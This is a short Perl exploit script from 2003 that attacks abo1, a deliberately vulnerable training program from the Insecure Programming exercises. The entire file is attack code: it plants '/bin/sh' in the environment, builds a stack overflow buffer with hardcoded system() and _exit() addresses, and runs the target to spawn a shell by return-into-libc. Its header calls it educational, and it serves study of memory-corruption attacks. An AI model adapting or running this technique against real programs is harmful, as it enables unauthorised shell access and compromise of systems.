#!/usr/bin/perl

# $Id: abo1-ex8.pl,v 1.1 2003/11/08 16:20:14 raptor Exp $
#
# abo1-ex7.pl - abo1.c exploit, for educational purposes
# Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# See http://community.core-sdi.com/~gera/InsecureProgramming/
#
# Small perl version of the previous ret-into-libc exploit (/bin/sh in env).
#

$vuln =		"./abo1";		# path to the vulnerable buffer
$system =	0x4005f590;		# address of system() in libc
$exit =		0x400bae90;		# address of _exit() in libc
$cmd =		"/bin/sh";		# command that will be executed

# put the /bin/sh string in environment
undef %ENV;
$ENV{SHELL} = $cmd;
$shell = 0xbffffffa - length($cmd) - length($vuln);

# build the evil buffer
$buf = 		"A"x260 . 
		pack("L", $system) . 
		pack("L", $exit) . 
		pack("L", $shell);

# print some output
printf "Using system() address\t: 0x%x\n", $system;
printf "Using _exit() address\t: 0x%x\n", $exit;
printf "Using /bin/sh address\t: 0x%x\n\n", $shell;

# run the vulnerable program
exec $vuln, $buf;
